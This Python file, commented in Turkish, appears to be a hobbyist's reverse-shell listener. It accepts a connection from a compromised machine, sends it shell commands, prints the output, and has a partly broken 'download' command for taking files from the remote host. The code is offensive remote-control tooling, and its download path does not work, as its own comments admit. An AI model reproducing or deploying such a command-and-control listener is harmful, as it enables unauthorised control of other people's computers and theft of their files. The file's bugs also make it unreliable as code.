import socket
import json

import subprocess
import shlex



class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #eğer bağlantı koparsa socketi tekrar kullanmak için gardaş la

        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Baglanti bekleniyor")
        self.connection, address = listener.accept()
        print("[+] Baglanti -> " +str(address))


    def reliable_send(self, data):
        json_data = json.dumps(data)
        byte_data = json_data.encode("utf-8")
        self.connection.send(byte_data)


    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                chunk = self.connection.recv(1024)
                if not chunk:
                    break
                json_data += chunk
                decoded_data = json_data.decode("utf-8")
                return json.loads(decoded_data)
            except ValueError:
                continue



    def remote(self, command):
        # self.connection.send(command)

        try:
            if command.strip() == "!stop":
                    self.reliable_send(command)
                    print("Dinleme durdu")
                    return exit()
            
            if command.startswith("download "):
                self.reliable_send(command)

            elif self.is_system_command(command):
                self.reliable_send(command)
                resultt = self.reliable_receive()
                print(resultt)
            else:
                print("bu bir sistem komutu değil gönderilemedi")
                
        except socket.error as se:
            print("karşı tarafla olan bağlantı yok haci", se)
            return exit()
        except Exception as e :
            print("öngörülmemiş exception hatası: ", e)


    def is_system_command(self, command):
        cmd_parts = shlex.split(command)

        if subprocess.run(["which", cmd_parts[0]], capture_output=True).returncode == 0:
            return True
        return False


    def write_file(self, path, content):
        with open(path, "wb+") as file:
            file.write(content) # dosyanın içindeki contenti alamıyor o yüzden yazamıyor 
            return "[+] Dosya İndirildi"
        

    def run(self):
        while True:
            command = input("-> ")
            result = self.remote(command)

            if command.startswith("download"):
                command = command.split(" ")
                print(result)
                print(command[1])
                result = self.write_file(command[1], result)    
    



            # self.remote(command)


my_listener = Listener("127.0.0.1", 4040)
my_listener.run()

# while True:
#     command = input("-> ")
#     connection.send(command.encode("utf-8"))
#     result = connection.recv(1024)
#     print(result.decode("utf-8"))



